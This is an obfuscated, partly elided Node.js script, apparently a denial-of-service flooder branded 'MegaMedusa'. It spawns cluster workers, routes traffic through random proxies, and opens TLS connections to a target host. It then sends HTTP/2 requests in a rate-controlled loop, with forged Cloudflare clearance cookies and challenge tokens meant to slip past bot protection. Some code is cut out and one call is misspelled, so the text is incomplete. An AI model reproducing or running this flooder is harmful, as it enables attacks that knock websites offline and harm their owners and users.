...
function getStatus() {
  ...
  Promise.race([_0xd9abba, _0x27f6f7]).then(_0x5803a1 => {
    ...
    console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + ip_spoof() + "[31m) [33m/[0m " + getTitleFromHTML(_0x565504) + " ([32m" + _0x4eb5cb + "[0m)");
  }).catch(_0x49ef19 => {
    if (_0x49ef19.message === "[31mRequest timed out[0m") {
      console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + ip_spoof() + "[31m) [33m/[0m [33mRequest Timed Out[0m");
    } else if (_0x49ef19.response) {
      const _0x36face = getTitleFromHTML(_0x49ef19.response.data);
      console.log("[31m[[33mMegaMedusa[31m] [32m-> [31m(" + ip_spoof() + "[31m) [33m/[0m " + _0x36face + " ([31m" + _0x49ef19.response.status + "[0m)");
    } else {
...
function randstr(_0x6ba01d) {
  var _0x404460 = "";
  var _0x162f15 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var _0x1b31e9 = _0x162f15.length;
  for (var _0x3bc4bc = 0; _0x3bc4bc < _0x6ba01d; _0x3bc4bc++) {
    _0x404460 += _0x162f15.charAt(Math.floor(Math.random() * _0x1b31e9));
  }
  ;
  return _0x404460;
}
function randayat(_0x19c864) {
  var _0x1175de = "";
  var _0x4d98d5 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var _0x40e4e7 = _0x4d98d5.length;
  for (var _0x1eada6 = 0; _0x1eada6 < _0x19c864; _0x1eada6++) {
    _0x1175de += _0x4d98d5.charAt(Math.floor(Math.random() * _0x40e4e7));
  }
  ;
  return _0x1175de;
}
function randnombor(_0x3af870) {
  var _0x5c028c = "";
  var _0x5282b6 = "0123456789";
  var _0x46ebb3 = _0x5282b6.length;
  for (var _0x3e898c = 0; _0x3e898c < _0x3af870; _0x3e898c++) {
    _0x5c028c += _0x5282b6.charAt(Math.floor(Math.random() * _0x46ebb3));
  }
  ;
  return _0x5c028c;
}
function randomElement(_0x21da9f) {
  return _0x21da9f[randomIntn(0, _0x21da9f.length)];
}
const ip_spoof = () => {
  const _0x62c6c9 = () => {
    return Math.floor(Math.random() * 256);
  };
  return _0x62c6c9() + "." + _0x62c6c9() + "." + _0x62c6c9() + "." + _0x62c6c9();
};
...
const os = require("os");
const MAX_RAM_PERCENTAGE = 10000000;
const RESTART_DELAY = 0;
function getRandomHeapSize() {
  const _0x2c4046 = 512;
  const _0x1387e = 2048;
  return Math.floor(Math.random() * (_0x1387e - _0x2c4046 + 1)) + _0x2c4046;
}
if (cluster.isMaster) {
  console.clear();
  console.log("");
  ...
  const restartScript = () => {
    ...
    setTimeout(() => {
      for (let _0x26b37f = 1; _0x26b37f <= process.argv[5]; _0x26b37f++) {
        const _0x5f5db8 = getRandomHeapSize();
        cluster.fork({
  ...
  const handleRAMUsage = () => {
    ...
    const _0xa737ae = _0x2e6733 / _0x499ee8 * 0;
    if (_0xa737ae >= MAX_RAM_PERCENTAGE) {
      console.log("[!] Maximum RAM usage:", _0xa737ae.toFixed(2), "%");
      restartScript();
    }
  };
...
class NetSocket {
  ...
  async HTTP(_0x5b2a5b, _0x37b110) {
    ...
    return new Promise((_0x1e0848, _0x3692c1) => {
      ...
      _0x3a51f9.setTimeout(_0x153ae9 * 1000);
      _0x3a51f9.setKeepAlive(true, 100000);
...
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.randdom() * pathts.length)] + "&" + randstr(10) + queryString + randstr(10);
...
headers.cookie = ["cf_clearance=" + randstr(32) + "." + randstr(10) + "-" + randstr(10) + "-1.0.1.1-" + randstr(11) + "_vs_V." + randstr(21) + "_" + randstr(47), "?__cf_chl_tk=" + randayat(43) + "-" + randnombor(10) + "-0.0.1.1" + randnombor(4)];
...
function runFlooder() {
  const _0x4547fe = randomElement(proxies);
  ...
  Socker.HTTP(_0x50454d, (_0x9e698b, _0x19756f) => {
    ...
    _0x9e698b.setKeepAlive(true, 600000);
    const _0xe0f417 = {
    ...
    const _0x3ae3b7 = tls.connect(443, parsedTarget.host, _0xe0f417);
    _0x3ae3b7.setKeepAlive(true, 60000);
    ...
    _0x141f53.on("connect", () => {
      const _0x3dfc63 = setInterval(() => {
        for (let _0x19e18a = 0; _0x19e18a < args.Rate; _0x19e18a++) {
          const _0x49616b = _0x141f53.request(headers).on("response", _0x4c1532 => {
            _0x49616b.close();
            _0x49616b.destroy();
            return;
          });
